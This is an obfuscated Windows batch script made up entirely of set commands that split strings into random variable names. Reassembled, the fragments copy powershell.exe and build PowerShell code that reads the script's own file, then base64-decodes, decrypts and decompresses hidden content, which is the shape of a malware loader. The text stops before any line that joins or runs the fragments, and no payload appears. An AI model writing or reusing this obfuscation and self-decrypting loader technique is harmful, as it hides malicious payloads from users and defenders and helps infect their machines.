@echo off
set "edcOZGJLLP=po"
set "sWSKWjIQyG=ws"
set "cyYsAYsmzL=do"
set "flgswocOrz=\W"
set "WPpFhEagdV=rS"
set "mEVieFAnnt=.e"
set "goUqSYIihl=he"
set "KebIJEYMay=xe"
set "OlUbchjarG= /"
set "peuNlAMCOb=ow"
set "EHXUvgxtvo=py"
set "zzDOAGWFKd=rs"
set "hqjgADAWep=ll"
set "BTQaejxkbg=in"
set "fBJnQUdUBf=co"
set "WUYaJNxZUX=\v"
set "sRIRRCsMlm=y "
set "wOIDDgrXVD=Wi"
set "VGbhCIZxcI=32"
set "IwQLSVNicz=s\"
set "OqYtqGGjfE=0\"
set "DMFbCcQbct=Po"
set "UdUvfuxaCK=:\"
set "brIuZJPeGA=nd"
set "UrpDxUnfWT=ll"
set "FttcusuUsc=st"
set "STcSwxtcnX=we"
set "lPwWFHmORx=we"
set "YGeWLCvAvw=Sy"
set "KwLFGpEZAN= C"
set "uOiUVFAWBd=em"
set "bKXhSDdbtp=1."
set "AHMvDpTWQy=he"
set "txXkhjxbnM= %~dp0"
set "brwJKDsSeU=cd"
set "ThtHADRrxm=pose"
set "SdtYHQGEAE=]::("
set "TvrMgMpoiS=ewLi"
set "jHhAfWSQEk=comp"
set "NLEEDbjVMc=ptor"
set "xkbKKMgous=, $n"
set "PtiulmhFcv=Hu ="
set "OITBtSheKS=tem."
set "CFDmZZScXJ=GuNt"
set "ZXnJAYZyCv=rtS4"
set "NavevbyZqT=in $"
set "QAYPQcSDlM=);$V"
set "UCfOJFFith=y.Pa"
set "mFxzyuMTMj=nLMa"
set "VdTekDKRiL=AJjI"
set "nvXCKnNVFE=bstr"
set "DsVdFSaKnO=O, 0"
set "EEUcyEOjkR=7;$t"
set "sTYJoliCLs=pose"
set "cAlBnWUMlp= New"
set "OkpaZiHBrc=ress"
set "vpTxHkaPSX=ufNK"
set "CAEnYBmkng=ing("
set "oiHfbSJQtb=6] -"
set "gnnQTUFXUt=Comp"
set "UjznytjOLd=ay()"
set "zifmnmNeIK=('%~f0'"
set "cfgxKDbnvr=m(, "
set "jvNPyRoAgI=::('"
set "pqjCvXpKnv=rans"
set "WLAghMAwtu=ert]"
set "XtHxyRvrSA=Syst"
set "TZkhfapkzR=m.Re"
set "yzSyIHhikT=7Yiv"
set "FLlrueQprP=aO ="
set "qaQrtrokXe=ispo"
set "TpbmLqzoUu= if "
set "UADXdKnCap=, (,"
set "wCVnJnLLJx=em.C"
set "NUPvuLOfQz='[-1"
set "RSAUhJQwrb=stem"
set "BaPoAXqAAN=-joi"
set "qqTitabfep=.Key"
set "RXinAiIKkW=e = "
set "YPszMFZmRq=qkm."
set "UIeZFSWzry=oint"
set "mXeBUnMsyU=Obje"
set "puWAyAvLGI= = $"
set "cTWCbTRDaH=ct S"
set "FBCwkzIMzv=tion"
set "ARHrcIWmuT=join"
set "WOcPedisMU=GuNt"
set "xeDMZbcMBz=ach "
set "WhORoXvRxh=morF"
set "QryiEwVjwc=yste"
set "KYfvRZcinV= [Sy"
set "bRkOStcFZx=.Len"
set "AUToNGOSYI=RrJ "
set "KKGChDbRRH=tem."
set "ODEBDZvlyM=ateD"
set "xzNXBFQvCc=).Sp"
set "HZbJGsywju=t Sy"
set "fWTYUZbwpA=comm"
set "VTeqgrLpub=[IO."
set "krEvUiVCfS=.Com"
set "ModxJWqIQu=16] "
set "tDyBeDDCLi=Nt.I"
set "yCymxyvrkE=hy.A"
set "CsdoHiPcbM=join"
set "TFGzENxFFq=em.I"
set "FmXFxcaykj=ew-O"
set "BhebyxkPiF=nLMa"
set "jKAiiUkuzt=  $q"
set "KLBrcJiNLp=cfr "
set "vQnMeShyKn=File"
set "wMvPNunKWh=pres"
set "NLvsGWGxiX=nage"
set "wnOtYuijtg=el, "
set "KvltNMgfGB=.Mod"
set "VSDKvlGuWT=iron"
set "hNmCZdhleA=ress"
set "GvuqtdYaYB=O = "
set "qVEcUwHKNg=eam("
set "zIPbrqSRLg=y.Ci"
set "PdiSOIEsFY=LMaO"
set "rVsqvNsDtu=($Mk"
set "hmkKLmCEla=e]::"
set "uYizDAjgEA=rity"
set "siesWIDWVb=;$Ew"
set "dbyQAxmqGC=)($n"
set "VHCvwVPJyI=F'[-"
set "rlbvfFmUbT=saBm"
set "MDbOYfivyC=tsWi"
set "jWLtDUGESY=Mode"
set "FTYEdMxIks=lit("
set "EgTdgPrOEa=ufNK"
set "zFaCUdYUAa=JjIh"
set "WxAakkOWlQ=sE.T"
set "nkdFDCrhmg= = ["
set "izTfSichSE=m.IO"
set "YuNRJXaBGa=n ''"
set "KNasgfmZcK=ct S"
set "ZHMXaWRySG=ypto"
set "QOJTIOyGMw=sion"
set "YkNjYGEcIW=.-16"
set "pUOZhETlsN=LMaO"
set "rCKebVWDnv=('da"
set "TPEHKoryPK=+hAO"
set "gztVktbsEV==');"
set "AEaXYZWBYV=brea"
set "mUMVwvhFGD=();$"
